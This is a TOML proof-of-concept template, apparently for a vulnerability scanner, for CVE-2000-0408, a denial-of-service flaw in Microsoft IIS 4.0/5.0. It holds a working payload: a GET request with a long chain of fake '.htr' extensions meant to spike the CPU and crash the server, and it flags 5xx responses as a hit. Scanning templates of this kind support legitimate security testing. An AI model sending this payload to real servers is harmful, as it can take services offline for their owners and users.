[info]
author = "AVE"
description = "Microsoft IIS 4.0/5.0 畸形文件扩展名拒绝服务漏洞验证。向目标发送包含大量伪造文件扩展名的超长URL，触发IIS扩展名解析异常，导致CPU占用100%使服务崩溃。"
id = "POC-AVE-2000-0335"
name = "CVE-2000-0408 PoC"
severity = "medium"
tags = ["cve-2000-0408"]
vuln_id = [
    "CVE-2000-0408",
    "AVE-2000-0335",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr..htr"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [
    500,
    503,
    502,
]
type = "status"
